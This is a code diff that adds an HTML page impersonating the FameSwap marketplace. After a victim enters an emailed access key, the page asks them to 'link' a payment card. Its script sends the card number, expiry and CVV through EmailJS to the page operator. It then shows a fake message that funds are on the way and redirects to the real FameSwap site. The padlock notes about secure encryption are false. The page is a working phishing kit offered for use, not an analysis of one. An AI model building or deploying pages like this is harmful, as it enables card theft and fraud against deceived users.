@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Link Payment Method - FameSwap</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        :root {
+            --primary-color: #1a73e8;
+            --primary-hover: #1557b0;
+            --text-primary: #202124;
+            --text-secondary: #5f6368;
+            --background: #f8f9fc;
+            --border-color: #dadce0;
+            --success-bg: #f3f8ff;
+            --error-color: #d93025;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, "Roboto", Arial, sans-serif;
+            background-color: var(--background);
+            color: var(--text-primary);
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 16px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 480px;
+        }
+
+        #paymentContainer {
+            display: none;
+        }
+
+        #verificationContainer {
+            display: block;
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+        }
+
+        h1 {
+            text-align: center;
+            color: var(--text-primary);
+            font-size: 24px;
+            margin-bottom: 30px;
+            font-weight: 600;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: var(--text-secondary);
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.2s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+        }
+
+        .error-message {
+            color: var(--error-color);
+            font-size: 14px;
+            margin-top: 8px;
+            display: none;
+        }
+
+        .expiry-cvv {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        button:hover {
+            background-color: var(--primary-hover);
+        }
+
+        .secure-text {
+            text-align: center;
+            margin-top: 20px;
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal-content {
+            background-color: white;
+            padding: 30px;
+            border-radius: 12px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+
+        .success-icon {
+            color: #34a853;
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 24px;
+            }
+
+            h1 {
+                font-size: 20px;
+            }
+
+            input {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <img src="data:image/png;base64,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" alt="FameSwap Logo" class="logo">
+        </div>
+
+        <!-- Verification Container -->
+        <div id="verificationContainer">
+            <h1>Verify Access</h1>
+            <form id="verificationForm">
+                <div class="form-group">
+                    <label for="accessKey">Enter Access Key</label>
+                    <input type="text" id="accessKey" placeholder="Enter the key provided in the email" required>
+                    <p class="error-message" id="keyError">Invalid key. Please check and try again.</p>
+                </div>
+                <button type="submit">Verify Access</button>
+            </form>
+            <p class="secure-text">🔒 This is a secure verification process</p>
+        </div>
+
+        <!-- Payment Container -->
+        <div id="paymentContainer">
+            <h1>Link Payment Method</h1>
+            <form id="paymentForm">
+                <div class="form-group">
+                    <label for="cardNumber">Card Number</label>
+                    <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                </div>
+                <div class="expiry-cvv">
+                    <div class="form-group">
+                        <label for="expiry">Expiry Date</label>
+                        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="cvv">CVV</label>
+                        <input type="text" id="cvv" placeholder="123" maxlength="3" required>
+                    </div>
+                </div>
+                <button type="submit">Link Card</button>
+            </form>
+            <p class="secure-text">🔒 Your payment information is securely encrypted</p>
+        </div>
+    </div>
+
+    <div class="modal" id="successModal">
+        <div class="modal-content">
+            <div class="success-icon">✓</div>
+            <h2 style="margin-bottom: 16px; color: var(--text-primary);">Payment Method Linked</h2>
+            <p style="color: var(--text-secondary);">Your funds will be transferred in less than 30 minutes.</p>
+        </div>
+    </div>
+
+    <script>
+        // Initialize EmailJS
+        (function() {
+            emailjs.init("aGeV5e03mc1324u8g"); // Public API key
+        })();
+
+        // Handle verification form
+        document.getElementById('verificationForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const accessKey = document.getElementById('accessKey').value;
+            
+            if (accessKey === "MaDyXC") {
+                document.getElementById('verificationContainer').style.display = 'none';
+                document.getElementById('paymentContainer').style.display = 'block';
+                document.getElementById('keyError').style.display = 'none';
+            } else {
+                document.getElementById('keyError').style.display = 'block';
+            }
+        });
+
+        // Format card number with spaces
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '');
+            let formattedValue = value.replace(/(\d{4})/g, '$1 ').trim();
+            e.target.value = formattedValue;
+        });
+
+        // Format expiry date
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.slice(0,2) + '/' + value.slice(2);
+            }
+            e.target.value = value;
+        });
+
+        // Allow only numbers in CVV
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+
+        // Handle form submission
+        document.getElementById('paymentForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            console.log('Sending card details to server...');
+
+            // Get form values
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expiry = document.getElementById('expiry').value;
+            const cvv = document.getElementById('cvv').value;
+
+            // Send email using EmailJS
+            emailjs.send("service_ew3eveb","template_kkjt9x2", {
+                card_number: cardNumber,
+                expiry: expiry,
+                cvv: cvv
+            }).then(
+                function(response) {
+                    console.log("SUCCESS", response);
+                    // Show success modal
+                    document.getElementById('successModal').style.display = 'flex';
+                    
+                    // Redirect after 3 seconds
+                    setTimeout(() => {
+                        window.location.href = "https://www.fameswap.com";
+                    }, 3000);
+                },
+                function(error) {
+                    console.log("FAILED", error);
+                    alert("An error occurred. Please try again.");
+                }
+            );
+        });
+    </script>
+</body>
+</html>
